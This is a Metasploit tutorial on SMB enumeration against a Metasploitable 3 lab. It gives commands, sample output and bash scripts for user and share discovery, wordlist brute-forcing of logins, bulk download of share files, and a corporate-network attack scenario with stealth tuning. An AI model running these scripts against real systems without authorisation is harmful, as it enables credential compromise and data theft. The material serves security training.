# SMB Enumeration with Metasploit

## Overview

SMB (Server Message Block) is a network file sharing protocol used for sharing files, printers, and other resources between computers on a local network. This guide covers comprehensive SMB enumeration techniques using Metasploit auxiliary modules to identify service versions, enumerate users and shares, perform brute force attacks, and access shared resources.

## SMB Fundamentals

- **Port**: 445/TCP (modern), 139/TCP (legacy NetBIOS)
- **Purpose**: File and printer sharing, inter-process communication
- **Authentication**: Username and password required
- **Windows**: Native SMB implementation
- **Linux**: Samba (SMB implementation for Unix systems)

## Lab Environment Setup

For practical exercises, use the **Metasploitable 3** Windows target:

**Lab URL**: [Metasploitable 3 GitHub](https://github.com/rapid7/metasploitable3)

**Setup Instructions**:

1. Clone the Metasploitable 3 repository
2. Build the Windows target: `./build.sh windows2008`
3. Start the VM and note the IP address
4. Default SMB shares should be accessible

## Initial Setup and Configuration

### Starting Metasploit and Workspace

```bash
# Start PostgreSQL and Metasploit
sudo systemctl start postgresql
msfconsole

# Create dedicated workspace
msf6 > workspace -a smb_enum
msf6 > workspace smb_enum

# Set global RHOSTS variable
msf6 > setg RHOSTS 192.168.1.100
```

### Dynamic Target Configuration Script

```bash
#!/bin/bash

TARGET=$1
WORKSPACE="smb_scan_$(date +%Y%m%d_%H%M%S)"

echo "[*] Starting SMB enumeration"
echo "[*] Target: $TARGET"
echo "[*] Workspace: $WORKSPACE"

msfconsole -q -x "
workspace -a $WORKSPACE;
setg RHOSTS $TARGET;
echo '[+] Global RHOSTS set to $TARGET';
exit"
```

**Usage**:

```bash
chmod +x smb_setup.sh
./smb_setup.sh 192.168.1.100
```

## SMB Version Detection

### Finding SMB Modules

```bash
msf6 > search type:auxiliary name:smb

# Filter for scanner modules
msf6 > search type:auxiliary name:smb scanner
```

### SMB Version Scanning

```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.1.100:445 - Host is running Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
```

### Comprehensive Version Detection Script

```bash
#!/bin/bash

TARGET=$1

msfconsole -q -x "
workspace -a smb_version_check;
setg RHOSTS $TARGET;
use auxiliary/scanner/smb/smb_version;
run;
exit"
```

## User Enumeration

### SMB User Enumeration Module

```bash
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > info

Name: SMB User Enumeration (SAM EnumUsers)
Description:
  This module determines what local users exist via the SAM RPC service

msf6 auxiliary(scanner/smb/smb_enumusers) > run

[*] 192.168.1.100:445 - SMB - Using DOMAIN: WORKGROUP
[*] 192.168.1.100:445 - SMB - Found user: JOHN
[*] 192.168.1.100:445 - SMB - Found user: ELLIE
[*] 192.168.1.100:445 - SMB - Found user: AISHA
[*] 192.168.1.100:445 - SMB - Found user: SEAN
[*] 192.168.1.100:445 - SMB - Found user: EMMA
[*] 192.168.1.100:445 - SMB - Found user: ADMIN
[*] Scanned 1 of 1 hosts (100% complete)
```

### Advanced User Enumeration with Domain

```bash
msf6 > use auxiliary/scanner/smb/smb_enumusers_domain
msf6 auxiliary(scanner/smb/smb_enumusers_domain) > set SMBDomain WORKGROUP
msf6 auxiliary(scanner/smb/smb_enumusers_domain) > run
```

## Share Enumeration

### SMB Share Enumeration

```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > show options

Module options (auxiliary/scanner/smb/smb_enumshares):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain   .                no        The Windows domain to use for authentication
   SMBPass                      no        The password for the specified username
   SMBUser                      no        The username to authenticate as
   THREADS     1                yes       The number of concurrent threads

msf6 auxiliary(scanner/smb/smb_enumshares) > set ShowFiles true
msf6 auxiliary(scanner/smb/smb_enumshares) > run

[*] 192.168.1.100:445 - SMB - Found share: PUBLIC
[*] 192.168.1.100:445 - SMB - Share PUBLIC is readable
[*] 192.168.1.100:445 - SMB - Share PUBLIC path: /srv/samba/public
[*] 192.168.1.100:445 - SMB - Found share: JOHN
[*] 192.168.1.100:445 - SMB - Share JOHN is readable
[*] Scanned 1 of 1 hosts (100% complete)
```

### Comprehensive Share Discovery Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_FILE="smb_shares_$(date +%Y%m%d_%H%M%S).txt"

echo "[*] Enumerating SMB shares on $TARGET"

msfconsole -q -x "
workspace -a share_enum;
setg RHOSTS $TARGET;
use auxiliary/scanner/smb/smb_enumshares;
set ShowFiles true;
run;
exit" > $OUTPUT_FILE

echo "[+] Results saved to $OUTPUT_FILE"
cat $OUTPUT_FILE
```

## SMB Brute Force Attacks

### SMB Login Scanner

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting                      Required  Description
   ----               ---------------                      --------  -----------
   BLANK_PASSWORDS    false                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                                    yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false                                no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false                                no        Add all passwords in the current database to the list
   DB_ALL_USERS       false                                no        Add all users in the current database to the list
   PASSWORD                                               no        A specific password to authenticate with
   PASS_FILE          /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        File containing passwords, one per line
   RHOSTS                                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445                                 yes       The target port (TCP)
   SMBDomain          .                                    no        The Windows domain to use for authentication
   SMBPass                                                no        The password for the specified username
   SMBUser                                                no        The username to authenticate as
   STOP_ON_SUCCESS    false                                yes       Stop guessing when a credential works for a host
   THREADS            1                                   yes       The number of concurrent threads per host
   USERPASS_FILE                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false                                no        Try the username as the password for all users
   USER_FILE          /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
   VERBOSE            true                                 yes       Whether to print output for all attempts
```

### Targeted Brute Force Attack

```bash
# Target specific user (admin)
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser admin
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/smb/smb_login) > set THREADS 5
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 192.168.1.100:445 - SUCCESSFUL LOGIN (WORKGROUP\admin:password)
[*] Scanned 1 of 1 hosts (100% complete)
```

### Multi-User Brute Force

```bash
# Brute force multiple users
msf6 auxiliary(scanner/smb/smb_login) > unset SMBUser
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/smb/smb_login) > set USER_AS_PASS true
msf6 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/smb/smb_login) > run
```

### Advanced Brute Force Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=${2:-"/usr/share/metasploit-framework/data/wordlists/common_users.txt"}
PASS_LIST=${3:-"/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"}

echo "[*] Starting SMB brute force attack"
echo "[*] Target: $TARGET"
echo "[*] User list: $USER_LIST"
echo "[*] Password list: $PASS_LIST"

msfconsole -q -x "
workspace -a smb_brute_force;
setg RHOSTS $TARGET;
use auxiliary/scanner/smb/smb_login;
set USER_FILE $USER_LIST;
set PASS_FILE $PASS_LIST;
set STOP_ON_SUCCESS true;
set THREADS 10;
set VERBOSE false;
run;
credentials;
exit"
```

## Accessing SMB Shares

### Using smbclient for Manual Access

```bash
# List available shares
smbclient -L 192.168.1.100 -U admin

# Access specific share
smbclient //192.168.1.100/public -U admin

# Interactive SMB session commands:
smb: \> ls
smb: \> cd secret
smb: \> get flag.txt
smb: \> exit
```

### Automated Share Access Script

```bash
#!/bin/bash

TARGET=$1
USER=$2
PASS=$3
SHARE=$4

echo "[*] Accessing SMB share //$TARGET/$SHARE"

smbclient "//$TARGET/$SHARE" -U "$USER%$PASS" -c "ls; quit"

# Download all files from share
echo "[*] Downloading files from share..."
smbclient "//$TARGET/$SHARE" -U "$USER%$PASS" -c "prompt; mget *" -D /tmp/smb_downloads/

echo "[+] Files downloaded to /tmp/smb_downloads/"
```

## Complete SMB Enumeration Workflow

### Comprehensive Assessment Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_DIR="smb_full_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive SMB enumeration"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

msfconsole -q -x "
workspace -a full_smb_scan;
setg RHOSTS $TARGET;

echo '[+] Detecting SMB version';
use auxiliary/scanner/smb/smb_version;
run;

echo '[+] Enumerating SMB users';
use auxiliary/scanner/smb/smb_enumusers;
run;

echo '[+] Enumerating SMB shares';
use auxiliary/scanner/smb/smb_enumshares;
set ShowFiles true;
run;

echo '[+] Performing brute force attack';
use auxiliary/scanner/smb/smb_login;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt;
set STOP_ON_SUCCESS true;
set THREADS 5;
run;

echo '[+] SMB enumeration complete';
hosts;
services;
credentials;
exit" > $OUTPUT_DIR/full_report.txt

echo "[+] Comprehensive report saved to $OUTPUT_DIR/full_report.txt"
```

**Usage**:

```bash
chmod +x smb_complete_enum.sh
./smb_complete_enum.sh 192.168.1.100
```

## Advanced SMB Enumeration Techniques

### SMB Security Mode Detection

```bash
msf6 > use auxiliary/scanner/smb/smb_security_mode
msf6 auxiliary(scanner/smb/smb_security_mode) > run
```

### Pipe Enumeration

```bash
msf6 > use auxiliary/scanner/smb/smb_enum_pipes
msf6 auxiliary(scanner/smb/smb_enum_pipes) > run
```

### Group Policy Preference Extraction

```bash
msf6 > use auxiliary/scanner/smb/smb_enum_gpp
msf6 auxiliary(scanner/smb/smb_enum_gpp) > run
```

## Real-World Attack Scenario

### Corporate Network SMB Assessment

```bash
#!/bin/bash

NETWORK=$1

echo "[*] Starting corporate SMB assessment"
echo "[*] Network: $NETWORK"

# Phase 1: Discovery
./smb_setup.sh $NETWORK

# Phase 2: Version and share enumeration
msfconsole -q -x "
workspace corp_smb_assessment;
setg RHOSTS $NETWORK;
use auxiliary/scanner/smb/smb_version;
run;
use auxiliary/scanner/smb/smb_enumshares;
run;" > discovery_results.txt

# Phase 3: Credential attack on discovered shares
msfconsole -q -x "
workspace corp_smb_assessment;
use auxiliary/scanner/smb/smb_login;
set USER_FILE custom_corp_users.txt;
set PASS_FILE rockyou.txt;
set THREADS 15;
run;" > credential_results.txt

echo "[+] Assessment complete. Check discovery_results.txt and credential_results.txt"
```

## Best Practices and Security Considerations

### Optimization Tips

```bash
# For stealth operations
msf6 auxiliary(scanner/smb/smb_login) > set BRUTEFORCE_SPEED 3
msf6 auxiliary(scanner/smb/smb_login) > set THREADS 2

# For comprehensive testing
msf6 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/smb/smb_login) > set USER_AS_PASS true
```

### Common SMB Security Issues

1. **Weak credentials** (admin:password, administrator:admin)
2. **Anonymous access enabled**
3. **Outdated SMB versions** (SMBv1 vulnerabilities)
4. **Excessive share permissions**
5. **Group Policy Preferences with passwords**

### Defensive Recommendations

- Disable SMBv1 where possible
- Implement strong password policies
- Restrict share permissions using least privilege
- Monitor SMB authentication logs
- Use SMB signing where supported

## Next Steps

After successful SMB enumeration:

1. Use discovered credentials for other services
2. Check for password reuse across systems
3. Explore shares for sensitive information
4. Look for Group Policy Preference files with credentials
5. Move to HTTP enumeration for comprehensive assessment

This SMB enumeration methodology provides a thorough approach to assessing SMB services, from initial discovery to credential compromise and data access, enabling comprehensive network penetration testing.
